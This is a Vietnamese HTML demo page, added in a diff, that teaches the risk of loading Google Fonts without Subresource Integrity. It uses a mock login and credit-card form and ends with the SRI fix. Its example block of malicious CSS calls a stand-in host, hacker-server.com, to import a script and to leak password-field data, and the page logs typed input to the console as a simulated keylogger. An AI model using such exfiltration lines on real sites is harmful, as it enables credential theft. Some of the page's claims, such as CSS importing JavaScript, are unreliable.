@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Demo: Google Fonts Attack - Không có SRI</title>
+
+    <!-- ⚠️ NGUY HIỂM: Load Google Fonts KHÔNG có SRI -->
+    <!-- Nếu Google Fonts CDN bị hack, CSS này có thể chứa code độc hại -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap"
+      rel="stylesheet" />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Inter", Arial, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        padding: 20px;
+        color: #fff;
+      }
+
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 30px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      }
+
+      h1 {
+        text-align: center;
+        margin-bottom: 10px;
+        font-size: 2.5em;
+        font-family: "Inter", sans-serif;
+      }
+
+      .subtitle {
+        text-align: center;
+        margin-bottom: 30px;
+        opacity: 0.9;
+        font-size: 1.1em;
+      }
+
+      .warning-banner {
+        background: rgba(255, 0, 0, 0.3);
+        border: 2px solid #ff0000;
+        border-radius: 10px;
+        padding: 20px;
+        margin-bottom: 30px;
+        text-align: center;
+      }
+
+      .warning-banner h2 {
+        color: #ff6b6b;
+        margin-bottom: 10px;
+      }
+
+      .demo-section {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 15px;
+        padding: 20px;
+        margin-bottom: 20px;
+        border: 2px solid rgba(255, 255, 255, 0.2);
+      }
+
+      .demo-section h3 {
+        color: #ffd93d;
+        margin-bottom: 15px;
+        font-size: 1.3em;
+      }
+
+      .demo-section p {
+        margin-bottom: 15px;
+        line-height: 1.6;
+      }
+
+      form {
+        margin-top: 15px;
+      }
+
+      form label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+      }
+
+      form input {
+        width: 100%;
+        padding: 10px;
+        border-radius: 5px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        background: rgba(255, 255, 255, 0.1);
+        color: #fff;
+        margin-bottom: 15px;
+        font-size: 16px;
+        font-family: "Inter", sans-serif;
+      }
+
+      form input::placeholder {
+        color: rgba(255, 255, 255, 0.5);
+      }
+
+      .btn {
+        background: #ff6b6b;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+        margin: 5px;
+        transition: all 0.3s;
+        font-family: "Inter", sans-serif;
+      }
+
+      .btn:hover {
+        background: #ff5252;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(255, 107, 107, 0.4);
+      }
+
+      .result-box {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 15px;
+        margin-top: 15px;
+        min-height: 100px;
+        font-family: "Courier New", monospace;
+        font-size: 14px;
+      }
+
+      .alert {
+        background: rgba(255, 0, 0, 0.2);
+        border-left: 4px solid #ff0000;
+        padding: 15px;
+        margin-top: 15px;
+        border-radius: 5px;
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.7;
+        }
+      }
+
+      .info-box {
+        background: rgba(74, 144, 226, 0.2);
+        border-left: 4px solid #4a90e2;
+        padding: 20px;
+        margin-top: 20px;
+        border-radius: 10px;
+      }
+
+      .info-box h4 {
+        color: #4a90e2;
+        margin-bottom: 10px;
+      }
+
+      .info-box ul {
+        margin-left: 20px;
+        line-height: 1.8;
+      }
+
+      .code-block {
+        background: rgba(0, 0, 0, 0.5);
+        border-radius: 5px;
+        padding: 15px;
+        margin: 15px 0;
+        font-family: "Courier New", monospace;
+        font-size: 14px;
+        overflow-x: auto;
+      }
+
+      .risk-list {
+        list-style: none;
+        margin-left: 0;
+      }
+
+      .risk-list li {
+        padding: 10px;
+        margin-bottom: 10px;
+        background: rgba(255, 107, 107, 0.2);
+        border-left: 4px solid #ff6b6b;
+        border-radius: 5px;
+      }
+
+      .risk-list li::before {
+        content: "⚠️ ";
+        margin-right: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>🚨 Demo: Google Fonts Attack</h1>
+      <p class="subtitle">
+        Minh họa nguy cơ khi Google Fonts CDN bị tấn công và không có SRI
+      </p>
+
+      <div class="warning-banner">
+        <h2>⚠️ CẢNH BÁO: Google Fonts được load KHÔNG có SRI</h2>
+        <p>
+          Font này được load từ CDN mà không có integrity verification. Nếu CDN
+          bị hack, CSS có thể chứa code độc hại.
+        </p>
+      </div>
+
+      <div class="demo-section">
+        <h3>📝 Form đăng nhập (Sử dụng Google Fonts)</h3>
+        <p>
+          Form này sử dụng font Inter từ Google Fonts. Nếu Google Fonts CDN bị
+          hack, CSS có thể chứa code độc hại.
+        </p>
+
+        <form id="loginForm" onsubmit="handleSubmit(event)">
+          <label>Email:</label>
+          <input type="email" id="email" placeholder="your@email.com" />
+
+          <label>Mật khẩu:</label>
+          <input type="password" id="password" placeholder="••••••••" />
+
+          <label>Số thẻ tín dụng (để test):</label>
+          <input
+            type="text"
+            id="creditCard"
+            placeholder="1234 5678 9012 3456" />
+
+          <button type="submit" class="btn">Đăng nhập</button>
+        </form>
+
+        <div id="result" class="result-box"></div>
+        <div id="alert" class="alert" style="display: none"></div>
+      </div>
+
+      <div class="demo-section">
+        <h3>🔍 Các nguy cơ khi Google Fonts CDN bị hack:</h3>
+        <ul class="risk-list">
+          <li>
+            <strong>CSS Injection:</strong> CSS độc hại có thể inject keylogger
+            vào form inputs
+          </li>
+          <li>
+            <strong>@import Attack:</strong> CSS có thể @import script độc hại
+            từ server khác
+          </li>
+          <li>
+            <strong>UI Manipulation:</strong> CSS có thể thay đổi UI để đánh lừa
+            người dùng
+          </li>
+          <li>
+            <strong>Data Exfiltration:</strong> CSS có thể trigger code
+            execution thông qua animations
+          </li>
+          <li>
+            <strong>Phishing:</strong> CSS có thể tạo popup giả mạo để lừa người
+            dùng
+          </li>
+        </ul>
+      </div>
+
+      <div class="demo-section">
+        <h3>💻 Ví dụ CSS độc hại có thể được inject:</h3>
+        <div class="code-block">
+          /* CSS độc hại có thể chứa: */ @import
+          url('https://hacker-server.com/malicious.js'); /* Keylogger thông qua
+          CSS selectors */ input[type="password"]:focus { background-image:
+          url('https://hacker-server.com/steal?data=...'); } /* Trigger code
+          execution */ @keyframes attack { from { background:
+          url('https://hacker-server.com/execute'); } to { background:
+          url('https://hacker-server.com/execute'); } }
+        </div>
+      </div>
+
+      <div class="info-box">
+        <h4>📚 Giải thích:</h4>
+        <ul>
+          <li>
+            <strong>Google Fonts CDN:</strong> Font được load từ
+            <code>fonts.googleapis.com</code>
+          </li>
+          <li>
+            <strong>Không có SRI:</strong> Browser không verify hash của CSS
+            trước khi load
+          </li>
+          <li>
+            <strong>Nếu CDN bị hack:</strong> Hacker có thể thay đổi CSS thành
+            code độc hại
+          </li>
+          <li>
+            <strong>Hậu quả:</strong> Keylogger, data theft, UI manipulation có
+            thể xảy ra
+          </li>
+          <li>
+            <strong>Giải pháp:</strong> Sử dụng SRI với integrity attribute để
+            verify hash của CSS
+          </li>
+        </ul>
+
+        <div style="margin-top: 20px">
+          <h4 style="color: #4a90e2; margin-bottom: 10px">
+            ✅ Cách bảo vệ với SRI:
+          </h4>
+          <div class="code-block">
+            &lt;link
+            href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap"
+            rel="stylesheet" integrity="sha384-..." crossorigin="anonymous"&gt;
+          </div>
+          <p style="margin-top: 10px">
+            Với SRI, nếu CSS bị thay đổi, browser sẽ từ chối load và hiển thị
+            lỗi trong Console.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function handleSubmit(e) {
+        e.preventDefault();
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        const creditCard = document.getElementById("creditCard").value;
+
+        document.getElementById(
+          "result"
+        ).innerHTML = `<p style="color: #ff6b6b;">⚠️ Form đã được gửi (KHÔNG AN TOÀN)</p>
+         <p>Email: ${email}</p>
+         <p style="color: #ff6b6b; margin-top: 10px;">
+           ⚠️ Nếu Google Fonts CDN bị hack, CSS có thể chứa keylogger và thông tin này có thể bị đánh cắp!
+         </p>`;
+
+        showAlert(
+          "alert",
+          "🚨 NẾU CSS TỪ GOOGLE FONTS CDN BỊ HACK, THÔNG TIN NÀY CÓ THỂ BỊ ĐÁNH CẮP!"
+        );
+      }
+
+      function showAlert(id, msg) {
+        const alertEl = document.getElementById(id);
+        alertEl.textContent = msg;
+        alertEl.style.display = "block";
+      }
+
+      // Giả lập: CSS độc hại từ Google Fonts CDN có thể chứa keylogger
+      console.log("⚠️ Google Fonts CSS được load từ CDN (KHÔNG có SRI)");
+      console.log("⚠️ Nếu CDN bị hack, CSS có thể chứa code độc hại");
+      console.log(
+        "⚠️ CSS có thể inject keylogger, @import script độc hại, hoặc manipulate UI"
+      );
+
+      // Intercept input changes (giả lập keylogger từ CSS)
+      const inputs = document.querySelectorAll("#loginForm input");
+      inputs.forEach((input) => {
+        input.addEventListener("input", function () {
+          const value = this.value;
+          const name = this.id;
+
+          if (value.length > 0) {
+            console.log(`🚨 CSS độc hại có thể đánh cắp ${name}: ${value}`);
+
+            // Giả lập: CSS có thể gửi data về server của hacker
+            if (value.length === 1) {
+              showAlert(
+                "alert",
+                `🚨 CSS độc hại có thể đang đánh cắp thông tin ${name}!`
+              );
+            }
+          }
+        });
+      });
+
+      // Giả lập: CSS có thể @import script độc hại
+      console.log(
+        "⚠️ CSS có thể chứa: @import url('https://hacker-server.com/malicious.js')"
+      );
+      console.log("⚠️ Script độc hại sẽ được load tự động nếu CSS bị hack");
+    </script>
+  </body>
+</html>
